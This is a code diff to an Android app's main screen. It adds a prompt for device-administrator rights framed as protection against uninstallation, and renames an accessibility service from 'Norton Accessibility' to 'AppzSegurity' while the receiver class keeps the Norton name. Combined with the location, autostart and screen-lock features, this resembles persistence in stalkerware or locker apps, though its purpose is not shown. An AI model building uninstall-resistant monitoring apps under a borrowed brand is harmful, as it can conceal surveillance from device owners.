@@ -62,6 +62,9 @@ public class MainActivity extends Activity implements View.OnClickListener {
         Button btnAutostart = findViewById(R.id.btn_autostart_perm);
         if (btnAutostart != null) btnAutostart.setOnClickListener(this);
 
+        Button btnDeviceAdmin = findViewById(R.id.btn_device_admin);
+        if (btnDeviceAdmin != null) btnDeviceAdmin.setOnClickListener(this);
+
         Button btnTest = findViewById(R.id.btn_test_lock);
         if (btnTest != null) btnTest.setOnClickListener(this);
 
@@ -192,13 +195,25 @@ public class MainActivity extends Activity implements View.OnClickListener {
         } else if (id == R.id.btn_accessibility_perm) {
             Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
             startActivity(intent);
-            Toast.makeText(this, "Busca 'Norton Accessibility' y actívalo", Toast.LENGTH_LONG).show();
+            Toast.makeText(this, "Busca 'AppzSegurity' y actívalo", Toast.LENGTH_LONG).show();
 
         } else if (id == R.id.btn_location_perm) {
             requestLocationPermissionIfNeeded();
 
         } else if (id == R.id.btn_autostart_perm) {
             openAutostartSettings();
+
+        } else if (id == R.id.btn_device_admin) {
+            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+            ComponentName adminComponent = new ComponentName(this, NortonDeviceAdminReceiver.class);
+            if (!dpm.isAdminActive(adminComponent)) {
+                Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+                intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
+                intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Protege AppzSegurity contra desinstalación.");
+                startActivity(intent);
+            } else {
+                Toast.makeText(this, "Protección contra desinstalación ya activa", Toast.LENGTH_SHORT).show();
+            }
 
         } else if (id == R.id.btn_test_lock) {
             // Iniciar vista previa de bloqueo por 10 segundos
